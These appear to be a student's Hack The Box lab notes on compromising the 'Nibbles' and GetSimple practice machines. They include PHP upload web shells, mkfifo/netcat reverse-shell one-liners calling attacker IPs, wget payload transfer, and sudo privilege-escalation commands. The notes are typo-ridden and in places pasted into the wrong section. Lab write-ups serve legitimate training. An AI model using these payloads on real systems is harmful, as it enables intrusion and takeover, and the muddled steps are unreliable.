 $whatweb <ip>
also check together $curl http://... expose /nibbleslog/  then -> check with which reveal $whatweb http://<url/ip>/nibbleslog
-> search google for nibbleglog exploit" https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/ => this flaw allow an authenticated atker to upload and executed arbitrary PHP code on the underlying web server
the metasploit module in question wok for version 4.0.3. we donot know ... -> look at the source code of the metasploit module, we can see that the exploi uses user-supplied credentials to authenticate the admin portal at /admin.php
-use gobuster to be thorough and check fo any other accessible pages/directory
$gobuster dir -u http://<ip>/nibbleglog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
-> it will result in endpoint list (dir path) and even a README page for interesting infor such as version number
-> $curl http://<ip>/nibbleglog/README -> THE PHP version are in use -> checking admin pỏtal
-> use default credential admin:admin and admin:pasword, to no aval there is a reset password function but we receive an email error
and hight rate request trigger a lockout -> back to the dir brute-forcing reslt the 200 status code show pages/dir that are directly accessible,the 403 status code in the out put indicate access to these resource are forbit.
301 is a permanent redirect -> try to explore all => brosing to https://<ip>/nibbleblog/content -> show some interesting subdir public, private, and tmp. digging around for a while we find users.xml file which at least seem to confirm the user name is indeed admin
it also show backlisted IP addr -> request file using curl

$curl -s http://<ip>/nibbleglog/content/private/user.xml | xmllint --format -
-> now we got the ID -> seach of nibbleblog related doc show that the pw is set during installation. there no known default password
-> now we have + a nibbleblog install potentially vul to an authenticated file upload vul
    + an admin portal at nibbleblog/admin.php
    +dir listing which confirmed that admin is a valid username
    +login brute-forcing protection blacklists our IP addr after too many invalid login attemps. this takes login brute-forcing with a tool such as hydra off the table
-There are no other ports open and we did not find any other dir. which we can confirm by performing additional dir brute-forcing against the root of the web app
$gobuster dir -u http://<ip>/ --wordlist //usr/share/seclists/Discovery/Web-Content/common.txt
taking aother look through all of the exposed dir in config.xml 
$curl -s http://<ip>/nibbleblog/content/private/config.xml | xmllint --formt -
-> we do see 2 mentions of nibbles in the site title awa the noti email addr. this could be password
-> performing password cracking offline with Hashcat or attempting to guess a pw, 
it is not uncommon to successfully crack a pw hash (such as a com wireless network passphrase) using a wordlist genrated by crawling their web using tool
$CeWL https://github.com/digininja/CeWL

This shows us how crucial thorough enumeration is. Let us recap what we have found so far:

We started with a simple nmap scan showing two open ports

Discovered an instance of Nibbleblog

Analyzed the technologies in use using whatweb

Found the admin login portal page at admin.php

Discovered that directory listing is enabled and browsed several directories

Confirmed that admin was the valid username

Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts

Uncovered clues that led us to a valid admin password of nibbles

Keep in mind that iterative enumeration, along with detailed notetaking, is one of the keys to success in this field
==========================================================
\\\\ Nibble - Initial Foothold
now that we are login into admin portal, we need to attempt to turn thiss access into code execution and ultimatelt gain reverse shell access to web browser,
metaploit module will likely work for this. but enum the admin portal for other avenues.
$gobuster dir -u http://<ip>/nibbleglog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
<result> we found some pages like plugins which will grand us install or uninstall plugins, the My image plugin allows us to upload an image file could this be abused to upload PHP code potentially
->attempting to make newpage and embed code or upload files does not seem like path  -> use this plugin to upload a snippet of PHP code instead of an image,
$<php> <?php system('id'); ?> this snippet can be used to test for code execution
-> save the code to a file and then click on the browse button and upload it
we get a bunch of errors but it seem like the file may have uplaoded
-Now we have to find out where the file uploaded ì it was successful. going back to the dir brute-forcing results, we remember the /content 
-under this there is a plugin dir and another subdir for my_image 
the fullpath is at http://<host>/nibbleblog/content/private/plugins/my_image/ in this dir we see 2 file, db.xml and image.php. with a lastest modified date, meaning that our upload was successful 
let check if we have command execution
$curl http://<ip>/nibbleblog/content/private/plugins/my_image/image.php
-> pawned it look like we have gined remote code execution on the web server, and the apache server is running in the nibbler user contexxt.
let modified the PHP file to obtain a reverse shell and startpoking around the server
<cheat> the reverse shell cheatsheet https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-udp
$<bash>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
NOTE add tun0 VPN IP addr in the <ATTACKING IP> placeholder and a port of our choice for <LISTENING PORT> to catch the reverse shell on our netcat listener.
$<php> <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
upload the file again and start a netcat listener in terminal
$nc -lvnp 9443
-> cURL the image page again or browse to it in firefox at http://nibbleblog/content/private/plugins/my_image/image.php to execute the reverse shell.
$nc -lvnp 9443
before go futher more let upgrade TTY (since speific command such as su wil not work)
<cheat>https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
$<bash>python -c 'import pty; pty.spawn("/bin/bash")'  this will spawn a pseudo-terminal so command such as su and sudo work as discussed 
Try the various techniques for upgrading to a full TTY and pick one that work best for us. our first attemp fail since python2 seem to be missing from the system
-> search <bash>$ which python3
/usr/bin/python3
-> We have Python3 though, which works to get us to a friendlier shell by typing python3 -c 'import pty; pty.spawn("/bin/bash")'
-> browsing to /home/nibber, found user.txt aws personal.zip
<test> Gain a foothold on the target and submit the user.txt flag
$nmap -sV -v --top-ports 100 10.129.228.83  
<result> 22 openssh 7.2p2 ubuntu  80 apache httpd 2.4.18 -> banner grab nc -nv 10.129.228.83 22,80
$curl http://10.129.228.83 <result> <find path /nibbleblog/>
-> browsing http://10.129.228.83/nibbleblog/
# tjust test for -> $msfconsole ->$search exploit nibbleblog -> use exploit/... -> show targets -> set TARGET <target-id>
->show options -> exploit
#try to enum web dir
$gobuster dir -u http://10.129.228.83/nibbleblog/ --wordlist /usr/share/lists/Discovery/Web-Content/common.txt
<result> 
/.htpasswd            (Status: 403) [Size: 308]
/.htaccess            (Status: 403) [Size: 308]
/.hta                 (Status: 403) [Size: 303]
/README               (Status: 200) [Size: 4628]
/admin                (Status: 301) [Size: 325] [--> http://10.129.228.83/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 327] [--> http://10.129.228.83/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 329] [--> http://10.129.228.83/nibbleblog/languages/]
#try to access $curl http://10.129.228.83/nibbleblog/README 
<result> confirm version v4.0.3
*directory "Content"
-> try to access other 301 status "content" -> found user.xml admin search for default password of nibbleblog
-> try to access config.xml -> found 2 repeat nibbles ->try password
-> access web page admin access plugin -> my image upload try malicious code <pho> <?php system('id'); ?>
-> /var/www/html/nibbleblog/admin/kernel/helpers/ so this is the path where the code executed
go back dir brute forcing check for /content dir -> /plugins /my_image http://<ip>/nibblesblog/content/private/plugins/my_image/ found 2 file db.xml and image.php new modified
we got remote code execute on web server, and the apache server is running in the nibbler user context. let modified php
try to modified pho and get servese shell 
<script>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
https://highon.coffee/blog/reverse-shell-cheat-sheet/

$<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
cURL the image page again or browse to it in Firefox at http://nibbleblog/content/private/plugins/my_image/image.php to execute the reverse shell.
-> on atk machine run $nc -lvnp 9443
->got the shell now we need to make up tty
$python -c 'import pty; pty.spawn("/bin/bash")' ->failed python 2 missing 
$python -c 'import pty; pty.spawn("/bin/bash")'  -> $which python3
-> python3 -c 'import pty; pty.spawn("/bin/bash")' -> find /home/nibbler. 


\\\\\\\\\\============================
Nibbles - Privilege Escalation
-> try $unzip personal.zip -> $cat monitor.sh
let us put this aside for now and pull in the https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
to perform automated privilege escalation checks.
$sudo python3 -m http.server 8080  ->start http server
-> back on target type $wget http://<atkip>:8080/LinEnum.sh
if success we see a 200 success response on python http server -> chmod +x LinEnum.sh -> run ./LinEnum.sh
now we get root acc -> try to run /home/nibbler/personal/stuff/monitor.sh
<if> append a reverse shell one-liner to the end of it and executed with sudo we should get a reverse shell back as the root user. 
-> edit the monitor.sh file $echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.80 8443 >/tmp/f' | tee -a monitor.sh
$sudo bash /home/nibbler/personal/stuff/monitor.sh 
(User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
$nc -lvnp 8443  :waiting for root reverse
$ls ~/root.txt to find plag
10.129.194.166


\\\\\\\\\\\\\\\=========================
Nibbles-Alternate User Method - Metasploit
$msfconsole -> $search nibbleblog -> $use 0 (to load the selected exploit)
-> $set rhosts <targetip> -> $set lhost <atkip> -> $show options
- set the admin username and password admin:nibbles and the TARGETURI to nibbleblog
$set username admin -> set password nibbles -> set targeturi nibbleblog
- change the pyload type for our purpose let go with generic/shell_reverse_tcp/
-> $set payload generic/shell_reverse_tcp -> $show option -> $exploit
\\\\\\\\\\\\\\\\==========================
Common Pitfalls
connect to VPN: $sudo openvpn ./htb.ovpn
Getting VPN addr: $ip -4 a show tun0
check rounting table: $sudo netstat -rn
pinning gateway: $ping -c 4 10.10.14.1
one -device connect to VPN pawnbox 1  -> checking region
Changing SSH key and password: ssh-keygen 
bydefault ssh key are stored in the .ssh folder within our home folder /home/htb-student/.ssh

wwhat next
 Root a Retired Easy Box
 Root a Retired Medium Box
 Root an Active Box
 Complete an Easy Challenge
 Share a Walkthrough of a Retired Box
 Complete Offensive Academy Modules
 Root Live Medium/Hard Boxes
 Complete A Track
 Win a Hack The Box Battlegrounds Battle
 Complete A Pro Lab

 <test>Spawn the target, gain a foothold and submit the contents of the user.txt flag.
10.129.207.24
$nmap -sV -v -p- <targetip>
-> browsing <targetip> -> curl http://<targetip> Getsimple 
$whatweb http://<targetip> <result> ubuntu apache 2.4.41
$gobuster dir -u http://<ip>/nibbleglog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
<result>
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> checked admin login page
/backups              (Status: 301) [Size: 316] [--> nothing
/data                 (Status: 301) [Size: 313] [--> /cache/(ver 3.3.15){"status":"0","latest":"3.3.16","your_version":"3.3.15","message":"You have an old version - please upgrade"}
    /other/authorization/ <![CDATA[ 4f399dc72ff8e619e327800f851e9986 ]]>
    /user/admin <PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD> = admin
/index.php            (Status: 200) [Size: 5485]
/plugins              (Status: 301) [Size: 316] [--> http://10.129.207.24/plugins/]
/robots.txt           (Status: 200) [Size: 32] -> found /admin/
/server-status        (Status: 403) [Size: 278]
/sitemap.xml          (Status: 200) [Size: 431]
/theme                (Status: 301) [Size: 314] [--> http://10.129.207.24/theme/]
=> access <ip>/admin/login with admin/admin => success
=> access theme found that we can edit them that include inject some phpcode
=> inject $<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.80 9443 >/tmp/f"); ?>
=> listener from $nc -lvnp 9443 -> try to access /theme/Innovation/...
=> got the reverse -> try to find ls ~user.txt
-> python3 -c 'import pty; pty.spawn("/bin/bash")'
=> try to enum lin  https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
=> start transfer $sudo python3 -m http.server 8080  ->start http server
-> back on target type $wget http://<atkip>:8080/LinEnum.sh -> chmod +x LinEnum.sh -> ./LinEnum.sh
<result>
it listen from port 22
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root  root  4.0K Mar 12  2024 .
drwxr-xr-x 20 root  root  4.0K Mar 12  2024 ..
drwxr-xr-x  3 mrb3n mrb3n 4.0K Mar 12  2024 mrb3n
[+] Possible sudo pwnage!
/usr/bin/php
User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php

now we get root acc -> try to run /home/nibbler/personal/stuff/monitor.sh
<if> append a reverse shell one-liner to the end of it and executed with sudo we should get a reverse shell back as the root user. 
-> edit the monitor.sh file $echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.80 8443 >/tmp/f' | tee -a php
$sudo bash /home/nibbler/personal/stuff/monitor.sh 
(User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
$nc -lvnp 8443  :waiting for root reverse
$ls ~/root.txt to find plag
10.129.194.166
----------
$sudo -l to check available sudo command
-> $sudo php -r "system('/bin/bash');" (-r = run inline code directly from cmd)
whoami
==============
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
2ndway > run linpeas -> check for var/www/html/gsconfig.php 
su mrb3n
sudo su - (su: "switch user" – đổi sang user khác (mặc định là root)
-: tải môi trường login shell của user đó (/root/.bashrc, /etc/profile, v.v.))
cat root.txt